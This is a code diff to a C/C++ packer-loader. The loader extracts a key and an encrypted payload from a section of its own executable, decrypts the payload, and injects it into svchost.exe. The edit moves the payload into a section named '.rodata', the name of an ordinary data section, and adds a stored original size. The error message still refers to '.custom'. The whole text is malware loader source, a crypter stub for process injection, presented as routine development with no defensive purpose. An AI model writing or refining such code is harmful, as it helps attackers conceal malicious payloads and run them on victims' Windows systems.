@@ -14,20 +14,18 @@ char *get_packed_section(size_t *size) {
             dos_header->e_lfanew);
     IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(nt_headers + 1);
 
-    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
-        if (!strcmp((char *)sections[i].Name, ".custom")) {
-            *size = sections[i].SizeOfRawData;
-            return unpacker + sections[i].VirtualAddress;
-        }
+    size_t length = nt_headers->FileHeader.NumberOfSections;
+    if (strcmp((char *)sections[length - 1].Name, ".rodata")) {
+        return NULL;
     }
 
-    return NULL;
+    *size = sections[length - 1].SizeOfRawData;
+    return unpacker + sections[length - 1].VirtualAddress;
 }
 
 int main(int argc, char **argv)
 {
     loader_t loader;
-
     char *packed = get_packed_section(&loader.size);
     if (!packed) {
         std::cerr << "error: unable to find .custom section" << std::endl;
@@ -37,8 +35,11 @@ int main(int argc, char **argv)
     loader.key = (char *)malloc(KEY_SIZE);
     memcpy(loader.key, packed, KEY_SIZE);
 
-    loader.bytes = (char *)malloc(loader.size);
-    memcpy(loader.bytes, packed+KEY_SIZE, loader.size-KEY_SIZE);
+    loader.bytes = (char *)malloc(loader.size-KEY_SIZE);
+    memcpy(loader.bytes, packed+KEY_SIZE+8, loader.size-KEY_SIZE-8);
+
+    loader.size = loader.size - KEY_SIZE - 8;
+    memcpy(&loader.orig_size, packed+KEY_SIZE, 8);
 
     loader_decrypt(&loader);
     if (!loader_inject(&loader, "c:/windows/system32/svchost.exe")) {
